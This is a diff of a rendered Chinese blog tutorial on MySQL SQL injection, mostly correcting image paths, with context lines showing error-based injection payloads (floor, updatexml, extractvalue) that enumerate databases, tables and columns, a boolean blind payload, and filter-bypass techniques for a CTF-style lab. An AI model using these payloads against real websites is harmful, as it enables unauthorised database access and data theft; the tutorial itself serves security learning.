href="#MySQL%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">MySQL注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">联合查询注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4"><span class="toc-number">3.1.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9"><span class="toc-number">3.1.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bool%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.2.</span> <span class="toc-text">bool盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-1"><span class="toc-number">3.2.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-1"><span class="toc-number">3.2.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.3.</span> <span class="toc-text">时间盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-2"><span class="toc-number">3.3.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-2"><span class="toc-number">3.3.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-floor"><span class="toc-number">3.4.</span> <span class="toc-text">报错注入-floor</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-3"><span class="toc-number">3.4.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-3"><span class="toc-number">3.4.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-updatexml"><span class="toc-number">3.5.</span> <span class="toc-text">报错注入-updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-4"><span class="toc-number">3.5.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-4"><span class="toc-number">3.5.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5-extractvalue"><span class="toc-number">3.6.</span> <span class="toc-text">报错注入-extractvalue</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-5"><span class="toc-number">3.6.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-5"><span class="toc-number">3.6.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.7.</span> <span class="toc-text">宽字节注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%A8%A1%E6%9D%BF%E4%B8%8E%E6%AD%A5%E9%AA%A4-6"><span class="toc-number">3.7.1.</span> <span class="toc-text">payload模板与步骤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E6%84%8F%E4%BA%8B%E9%A1%B9-6"><span class="toc-number">3.7.2.</span> <span class="toc-text">注意事项</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.</span> <span class="toc-text">SQL注入绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.1.</span> <span class="toc-text">空格绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E8%81%94%E6%B3%A8%E9%87%8A%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.2.</span> <span class="toc-text">内联注释绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.3.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E5%85%B3%E9%94%AE%E8%AF%8D%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.4.</span> <span class="toc-text">双写关键词绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.5.</span> <span class="toc-text">编码绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E4%BB%B7%E5%87%BD%E6%95%B0%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2%E7%BB%95%E8%BF%87"><span class="toc-number">3.8.6.</span> <span class="toc-text">等价函数字符替换绕过</span></a></li></ol></li></ol></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://N4YST.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="Nayst"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="Nayst-blog"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">深入了解sql注入</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-08-30 15:20:42" itemprop="dateCreated datePublished" datetime="2021-08-30T15:20:42+08:00">2021-08-30</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <span class="post-meta-icon-text">更新于</span> <time title="修改时间：2022-05-01 17:32:13" itemprop="dateModified" datetime="2022-05-01T17:32:13+08:00">2022-05-01</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">4.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">18m</span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/web%E5%AE%89%E5%85%A8/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">web安全</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/web%E6%BC%8F%E6%B4%9E/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">web漏洞</span></a><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctf</span></a><a class="tag-item" href="/tags/mysql/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">mysql</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>注入漏洞</strong>在web前十漏洞中位居榜首，其中SQL注入最为经典。</p>
 <h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h2><p>SQL注入漏洞是指攻击者通过浏览器或者其他客户端将恶意SQL语句插入到网站参数中，而网站应用程序未对其进行过滤，将恶意SQL语句带入数据库使恶意SQL语句得以执行，从而使攻击者通过数据库获取敏感信息或者执行其他恶意操作。</p>
 <p>SQL注入漏洞可能会导致服务器的数据库信息泄露、数据被窃取、网页被篡改，甚至可能会造成网站被挂马、服务器被远程控制、被上后门等。</p>
 <ul>
@@ -170,11 +170,11 @@ $row &#x3D; mysql_fetch_array($result);
 <h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
 <li>union用于合并多个select语句的结果，并默认去重</li>
 </ol>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png" alt="image-20210724161433506" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724161433506.png" alt="image-20210724161433506" loading="lazy"></p>
 <ol start="2">
 <li>联合查询中合并的选择查询必须具相同的输出字段数，采用相同的顺序，并包含相同或兼容的数据类型</li>
 </ol>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png" alt="image-20210724160925428" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724160925428.png" alt="image-20210724160925428" loading="lazy"></p>
 <h2 id="bool盲注"><a href="#bool盲注" class="headerlink" title="bool盲注"></a>bool盲注</h2><p>与报错注入不同，bool盲注没有任何的报错信息输出，页面只有正常和不正常两种状态，攻击者只能通过返回的两个状态来判断输入的SQL语句是否正确，从而判断数据库中储存了哪些信息。</p>
 <h3 id="payload模板与步骤-1"><a href="#payload模板与步骤-1" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
 <li>获取数据库长度</li>
@@ -206,13 +206,13 @@ $row &#x3D; mysql_fetch_array($result);
 </ol>
 <p>语法格式：SUBSTR(字段名,A,N)</p>
 <p>从指定的字段从第A个字符（这里的字符从<strong>1</strong>开始）向后截取N个字符</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png" alt="image-20210724183800027" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724183800027.png" alt="image-20210724183800027" loading="lazy"></p>
 <ol start="2">
 <li>ascii函数</li>
 </ol>
 <p>语法格式：ASCII(字符)</p>
 <p>返回字符的ASCII码</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png" alt="image-20210724184056134" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184056134.png" alt="image-20210724184056134" loading="lazy"></p>
 <ol start="3">
 <li>脚本</li>
 </ol>
@@ -302,13 +302,13 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 </ol>
 <p>语法格式：SLEEP(时间)</p>
 <p>使执行挂起一段时间，单位为秒</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png" alt="image-20210724184131894" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184131894.png" alt="image-20210724184131894" loading="lazy"></p>
 <ol start="2">
 <li>if函数</li>
 </ol>
 <p>语法格式：IF(expr1,expr2,expr3)</p>
 <p>效果类似于编程语言中常见的三元运算符，如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png" alt="image-20210724184513617" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724184513617.png" alt="image-20210724184513617" loading="lazy"></p>
 <ol start="3">
 <li>脚本</li>
 </ol>
@@ -345,25 +345,25 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from (select count(*),concat(database(),floor(rand(0)*2)) x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png" alt="image-20210724221449012" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221449012.png" alt="image-20210724221449012" loading="lazy"></p>
 <ol start="2">
 <li>查表名</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from (select count(*),concat((select (table_name) from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2)) x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png" alt="image-20210724221612834" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724221612834.png" alt="image-20210724221612834" loading="lazy"></p>
 <ol start="3">
 <li>查列名</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from(select count(*),concat((select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png" alt="image-20210724224135261" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724224135261.png" alt="image-20210724224135261" loading="lazy"></p>
 <ol start="4">
 <li>查字段</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and (select 1 from (select count(*),concat((select 列名 from 表名 limit 0,1),0x3a,floor(rand()*2))x from information_schema.tables group by x)a)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png" alt="image-20210724230714048" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724230714048.png" alt="image-20210724230714048" loading="lazy"></p>
 <h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
 <li>floor函数</li>
 </ol>
@@ -375,7 +375,7 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 <p>语法格式：RAND()</p>
 <p>产生一个在0和1之间的随机数</p>
 <p>当提供一个种子数时，生成的随机数是相同的</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png" alt="image-20210724232103948" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210724232103948.png" alt="image-20210724232103948" loading="lazy"></p>
 <h2 id="报错注入-updatexml"><a href="#报错注入-updatexml" class="headerlink" title="报错注入-updatexml"></a>报错注入-updatexml</h2><p><code>updatexml</code>也是一种报错注入，它利用<code>updatexml</code>函数中第二个参数<code>XPATH_string</code>的报错进行注入。</p>
 <p><code>XPATH_string</code>是XML文档路径，格式是&#x2F;XXX&#x2F;XXX&#x2F;XXX&#x2F;，如果格式不正确就会报错</p>
 <h3 id="payload模板与步骤-4"><a href="#payload模板与步骤-4" class="headerlink" title="payload模板与步骤"></a>payload模板与步骤</h3><ol>
@@ -383,25 +383,25 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,database()),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png" alt="image-20210725110316413" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725110316413.png" alt="image-20210725110316413" loading="lazy"></p>
 <ol start="2">
 <li>查表名</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png" alt="image-20210725111053307" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111053307.png" alt="image-20210725111053307" loading="lazy"></p>
 <ol start="3">
 <li>查列名</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1)),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png" alt="image-20210725111329442" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111329442.png" alt="image-20210725111329442" loading="lazy"></p>
 <ol start="4">
 <li>查字段</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and updatexml(1,concat(0x7e,(select 列名 from 表名 limit 0,1)),0)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png" alt="image-20210725111528458" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725111528458.png" alt="image-20210725111528458" loading="lazy"></p>
 <h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
 <li>updataxml函数</li>
 </ol>
@@ -417,25 +417,25 @@ payload <span class="token operator">=</span> <span class="token string">""</spa
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,database()))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png" alt="image-20210725144530805" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725144530805.png" alt="image-20210725144530805" loading="lazy"></p>
 <ol start="2">
 <li>查表名</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png" alt="image-20210725145257615" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145257615.png" alt="image-20210725145257615" loading="lazy"></p>
 <ol start="3">
 <li>查列名</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;&#39;表名&#39; limit 0,1)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png" alt="image-20210725145450328" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725145450328.png" alt="image-20210725145450328" loading="lazy"></p>
 <ol start="4">
 <li>查字段</li>
 </ol>
 <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">id&#x3D;1 and extractvalue(1,concat(0x7e,(select 列名 from 库名 limit 0,1)))<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png" alt="image-20210725150025086" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210725150025086.png" alt="image-20210725150025086" loading="lazy"></p>
 <h3 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h3><ol>
 <li>extractvalue函数</li>
 </ol>
@@ -481,28 +481,28 @@ if(!preg_match(&#39;&#x2F; &#x2F;&#39;,$_GET[&quot;id&quot;]))&#123;
 <li>&#x2F;**&#x2F;</li>
 </ul>
 <p>MySQL数据库中可以用&#x2F;**&#x2F;（注释符）来代替空格，将空格用注释符代替后，SQL语句可以正常运行</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png" alt="image-20210726125323913" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125323913.png" alt="image-20210726125323913" loading="lazy"></p>
 <ul>
 <li>制表符</li>
 </ul>
 <p>在MySQL数据库中，可以用制表符（%09、%0B）来代替空格，制表符是不可见字符，在URL传输中需要编码</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png" alt="image-20210726125809221" loading="lazy"></p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png" alt="image-20210726125830823" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125809221.png" alt="image-20210726125809221" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125830823.png" alt="image-20210726125830823" loading="lazy"></p>
 <ul>
 <li>换行符</li>
 </ul>
 <p>MySQL数据库支持换行执行SQL语句，可以利用换行符（%0A、%0C）代替空格，换行符也是不可见字符，在URL传输中需要编码</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png" alt="image-20210726125908271" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726125908271.png" alt="image-20210726125908271" loading="lazy"></p>
 <ul>
 <li>括号</li>
 </ul>
 <p>在MySQL数据库中，任何查询中都可以使用括号嵌套SQL语句</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png" alt="image-20210726130541927" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726130541927.png" alt="image-20210726130541927" loading="lazy"></p>
 <p>MySQL数据库中有一个特性。</p>
 <p>在条件语句中，在<code>where id=1</code>后面加<code>=1</code>成为<code>where id=1=1</code>，就是对前面所有结果与1，查询结果与原来一样</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png" alt="image-20210726131604921" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131604921.png" alt="image-20210726131604921" loading="lazy"></p>
 <p>在<code>where id=1</code>后面加<code>=0</code>成为<code>where id=1=0</code>，就是对前面的所有结果与0（取反），即查询的结果除去原有查询结果的其他数据</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png" alt="image-20210726131919320" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726131919320.png" alt="image-20210726131919320" loading="lazy"></p>
 <p>利用以上特性，构造括号绕过payload就可以进行bool盲注，获得数据库的信息</p>
 <pre class="line-numbers language-none"><code class="language-none">id&#x3D;1&#x3D;(ascii(mid(database()from(1)for(1)))&#x3D;116)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
@@ -511,11 +511,11 @@ if(!preg_match(&#39;&#x2F; &#x2F;&#39;,$_GET[&quot;id&quot;]))&#123;
 <li>`</li>
 </ul>
 <p>MySQL中的反引号是为了区分MySQL的保留字与普通字而引入的符号，反引号可以代替空格</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png" alt="image-20210726145309481" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726145309481.png" alt="image-20210726145309481" loading="lazy"></p>
 <h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>MySQL会执行放在<code>/*! ···*/</code>中的语句。</p>
 <p><code>/*! 50010···/</code>也可以执行位于其中的SQL语句，其中50010表示SQL版本为5.00.10。当MySQL数据库的实际版本号大于内联注释中的版本号时，就会执行内联注释中的代码。</p>
 <p>当前MySQL数据库的版本是5.7.26，使用此版本的数据库进行验证</p>
-<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png" alt="image-20210726150609315" loading="lazy"></p>
+<p><img src="http://n4yst.github.io/2021/08/30/SQL%E6%B3%A8%E5%85%A5/image-20210726150609315.png" alt="image-20210726150609315" loading="lazy"></p>
 <h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>根据应用程序的过滤规则，通常会针对恶意关键字设置黑名单，如果存在恶意关键字，应用程序就会退出运行。</p>
 <p>在过滤规则中可能存在过滤不完整或者只过滤小写或者大写的情况，没有针对大小写组合进行过滤，导致可以通过大小写混写payload的方式来绕过关键字。</p>
 <pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">#漏洞代码示例
@@ -553,7 +553,7 @@ if(isser($_GET[&quot;id&quot;]))&#123;
 </li>
 </ul>
